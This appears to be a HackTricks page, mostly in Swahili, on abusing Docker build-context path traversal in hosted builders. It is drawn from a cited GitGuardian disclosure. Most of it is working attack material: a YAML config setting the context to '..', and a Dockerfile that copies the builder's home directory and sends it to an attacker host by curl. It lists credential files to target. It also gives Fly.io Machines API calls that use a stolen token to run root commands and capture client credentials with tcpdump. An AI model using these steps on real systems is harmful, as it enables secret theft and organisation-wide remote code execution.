# Kutumia vibaya Docker Build Context katika Hosted Builders (Path Traversal, Exfil, and Cloud Pivot)

{{#include ../banners/hacktricks-training.md}}

## TL;DR

Ikiwa jukwaa la CI/CD au hosted builder linamruhusu mchangiaji kubainisha njia ya Docker build context na njia ya Dockerfile, mara nyingi unaweza kuweka context kwa saraka ya mzazi (mfano, "..") na kufanya faili za mwenyeji kuwa sehemu ya build context. Kisha, Dockerfile iliyodhibitiwa na mshambuliaji inaweza kutumia COPY na exfiltrate siri zilizopatikana katika nyumbani kwa mtumiaji wa builder (kwa mfano, ~/.docker/config.json). Tokeni za registry zilizodukuliwa pia zinaweza kufanya kazi dhidi ya provider’s control-plane APIs, zikiruhusu RCE ya ngazi ya shirika.

## Attack surface

Huduma nyingi za hosted builder/registry hufanya takriban yafuatayo wakati wa kujenga images zilizowasilishwa na watumiaji:
- Soma repo-level config inayojumuisha:
- build context path (inayotumwa kwa Docker daemon)
- Dockerfile path relative to that context
- Nakili saraka ya build context iliyotajwa na Dockerfile kwenda Docker daemon
- Jenga image na kuiendesha kama hosted service

Ikiwa jukwaa halifanyi canonicalize na kuzuiya build context, mtumiaji anaweza kuiweka kwa eneo nje ya repository (path traversal), na kusababisha faili yoyote ya mwenyeji inayosomwa na build user kuwa sehemu ya build context na kupatikana kwa ajili ya COPY katika Dockerfile.

Practical constraints commonly observed:
- Dockerfile lazima iwe ndani ya chosen context path na njia yake lazima ijulikane mapema.
- build user lazima awe na haki za kusoma kwenye faili zilizojumuishwa katika context; special device files zinaweza kuvuruga nakili.

## PoC: Path traversal via Docker build context

Example malicious server config declaring a Dockerfile within the parent directory context:
```yaml
runtime: "container"
build:
dockerfile: "test/Dockerfile"   # Must reside inside the final context
dockerBuildPath: ".."           # Path traversal to builder user $HOME
startCommand:
type: "http"
configSchema:
type: "object"
properties:
apiKey:
type: "string"
required: ["apiKey"]
exampleConfig:
apiKey: "sk-example123"
```
- Kutumia ".." mara nyingi hurejea kwenye home ya mtumiaji builder (mf., /home/builder), ambayo kwa kawaida ina faili nyeti.
- Weka Dockerfile yako chini ya jina la directory la repo (mf., repo "test" → test/Dockerfile) ili ibaki ndani ya muktadha wa mzazi uliopanuliwa.

## PoC: Dockerfile ya kuingiza na ku-exfiltrate muktadha wa host
```dockerfile
FROM alpine
RUN apk add --no-cache curl
RUN mkdir /data
COPY . /data                      # Copies entire build context (now builder’s $HOME)
RUN curl -si https://attacker.tld/?d=$(find /data | base64 -w 0)
```
Malengo yanayopatikana mara kwa mara kutoka $HOME:
- ~/.docker/config.json (registry auths/tokens)
- Caches na configs nyingine za cloud/CLI (mfano, ~/.fly, ~/.kube, ~/.aws, ~/.config/*)

Tip: Hata ukiwa na .dockerignore katika repository, uchaguzi dhaifu wa platform-side context bado unasimamia ni nini kinachotumwa kwa daemon. Ikiwa platform inakopa path iliyochaguliwa kwa daemon kabla ya kutathmini .dockerignore ya repo yako, faili za host bado zinaweza kufichuliwa.

## Cloud pivot with overprivileged tokens (example: Fly.io Machines API)

Baadhi ya platforms hutolewa bearer token moja inayoweza kutumika kwa container registry na control-plane API. Ikiwa utaexfiltrate registry token, jaribu kuitumia dhidi ya provider API.

Example API calls against Fly.io Machines API using the stolen token from ~/.docker/config.json:

Orodhesha apps katika org:
```bash
curl -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps?org_slug=smithery"
```
Endesha amri kama root ndani ya mashine yoyote ya app:
```bash
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"","command":["id"],"container":"","stdin":"","timeout":5}'
```
Matokeo: remote code execution kwa shirika zima kwenye hosted apps zote ambapo token ina ruhusa za kutosha.

## Uibwa wa siri kutoka kwa hosted services zilizoathiriwa

Kwa exec/RCE kwenye hosted servers, unaweza kuvuna siri zilizotolewa na mteja (API keys, tokens) au kuanzisha prompt-injection attacks. Mfano: weka tcpdump na kunasa trafiki ya HTTP kwenye port 8080 ili kutoa kredenshiali zinazoingia.
```bash
# Install tcpdump inside the machine
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"apk add tcpdump","command":[],"container":"","stdin":"","timeout":5}'

# Capture traffic
curl -s -X POST -H "Authorization: Bearer fm2_..." \
"https://api.machines.dev/v1/apps/<app>/machines/<machine>/exec" \
--data '{"cmd":"tcpdump -i eth0 -w /tmp/log tcp port 8080","command":[],"container":"","stdin":"","timeout":5}'
```
Maombi yaliyorekodiwa mara nyingi yana client credentials katika headers, bodies, au query params.

## Marejeo

- [Breaking MCP Server Hosting: Build-Context Path Traversal to Org-wide RCE and Secret Theft](https://blog.gitguardian.com/breaking-mcp-server-hosting/)
- [Fly.io Machines API](https://fly.io/docs/machines/api/)

{{#include ../banners/hacktricks-training.md}}
